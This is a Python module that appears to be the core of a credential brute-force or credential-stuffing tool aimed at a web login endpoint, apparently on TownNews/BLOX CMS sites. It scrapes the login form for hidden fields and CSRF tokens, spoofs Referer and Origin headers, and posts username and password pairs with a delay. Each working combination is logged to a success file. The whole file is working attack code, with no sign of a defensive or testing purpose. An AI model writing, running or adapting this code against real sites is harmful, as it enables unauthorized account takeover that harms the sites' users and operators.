import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from typing import Optional, Set, Tuple, Dict
from utils.files_read_write_utils import save_to_file
from settings import (
    LOGIN_PAGE_URL,
    LOGIN_POST_URL,
    DEFAULT_SESSION_HEADERS,
    SUCCESS_FILE_PATH,
    USERNAME_PARAM_STRING,
    PASSWORD_PARAM_STRING,
    CSRF_PARAM_STRING,
    DELAY_BETWEEN_REQUESTS,
)


def create_session() -> Optional[requests.Session]:
    """
    Create a requests.Session with default headers and verify the login page is reachable.

    Returns:
        Optional[requests.Session]: A configured session if the server is reachable,
        None otherwise.
    """
    session = requests.Session()
    session.headers.update(DEFAULT_SESSION_HEADERS)
    try:
        r = session.get(LOGIN_PAGE_URL, timeout=10)
        if r.status_code != 200:
            print(f"[!] Server returned status: {r.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[!] Connection error: {e}")
        return None
    return session


def fetch_login_form(session: requests.Session) -> Tuple[str, Dict[str, str]]:
    """
    Fetch the login page and parse form details, including hidden inputs.

    Args:
        session (requests.Session): Active HTTP session.

    Returns:
        Tuple[str, Dict[str, str]]:
            - post_url (str): Absolute URL to send the POST request to.
            - form_values (dict): Hidden/default form inputs like 'redirect' or CSRF tokens.
    """
    r = session.get(LOGIN_PAGE_URL, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find("form")

    post_action = form.get("action") if form and form.get("action") else None
    post_url = urljoin(LOGIN_PAGE_URL, post_action) if post_action else LOGIN_POST_URL

    form_values: Dict[str, str] = {}
    if form:
        for inp in form.find_all("input"):
            name = inp.get("name")
            val = inp.get("value", "")
            if name:
                form_values[name] = val

    return post_url, form_values


def try_login(
    session: requests.Session, known_success: Set[str], username: str, password: str
) -> bool:
    """
    Attempt to log in using a username and password.

    This function:
        - Fetches the login form to extract action URL and hidden inputs.
        - Builds a POST payload with username, password, optional redirect and CSRF token.
        - Updates session headers with Referer and Origin.
        - Sends a POST request and interprets JSON response.
        - Saves successful credentials to file and known_success set.

    Args:
        session (requests.Session): Active HTTP session.
        known_success (Set[str]): Set of already successful username:password combos.
        username (str): Username to try.
        password (str): Password to try.

    Returns:
        bool: True if login is successful, False otherwise.
    """
    post_url, form_values = fetch_login_form(session)

    payload = {
        USERNAME_PARAM_STRING: username,
        PASSWORD_PARAM_STRING: password,
    }

    payload["redirect"] = form_values.get("redirect", "/apps/tncms/login.cms")

    csrf_val = form_values.get(CSRF_PARAM_STRING)
    if not csrf_val:
        for alt in ("csrf_token", "_csrf", "token"):
            if alt in form_values:
                csrf_val = form_values[alt]
                break
    if csrf_val:
        payload[CSRF_PARAM_STRING] = csrf_val

    session.headers.update(
        {
            "Referer": LOGIN_PAGE_URL,
            "Origin": "{scheme}://{host}".format(
                scheme="https", host=LOGIN_PAGE_URL.split("://")[1].split("/")[0]
            ),
        }
    )

    try:
        resp = session.post(post_url, data=payload, timeout=15)
        time.sleep(DELAY_BETWEEN_REQUESTS)

        if resp.status_code != 200:
            print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
            return False

        try:
            response_json = resp.json()
        except ValueError:
            print(f"[!] Non-JSON response for {username}:{password}")
            return False

        if response_json.get("error") is False:
            combo = f"{username}:{password}"
            if combo not in known_success:
                save_to_file(SUCCESS_FILE_PATH, combo)
                known_success.add(combo)
            print(f"[+] Success: {combo}")
            return True

    except requests.RequestException as e:
        print(f"[!] Request error for {username}:{password} -> {e}")
    except Exception as e:
        print(f"[!] Unexpected error for {username}:{password} -> {e}")

    return False
